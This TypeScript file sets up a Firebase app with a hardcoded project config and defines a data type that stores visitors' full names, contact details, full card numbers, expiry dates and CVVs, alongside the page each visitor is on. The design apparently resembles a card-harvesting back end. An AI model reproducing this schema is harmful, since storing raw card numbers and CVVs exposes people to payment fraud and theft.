import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyC5q2ReYxL2qNdx6NbYfk8CjsHgoITFNtI",
  authDomain: "zainsps-92746.firebaseapp.com",
  databaseURL: "https://zainsps-92746-default-rtdb.firebaseio.com",
  projectId: "zainsps-92746",
  storageBucket: "zainsps-92746.firebasestorage.app",
  messagingSenderId: "1048830927722",
  appId: "1:1048830927722:web:d723eb77b0cc14f4587b13",
  measurementId: "G-7HPMLXNQGK"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
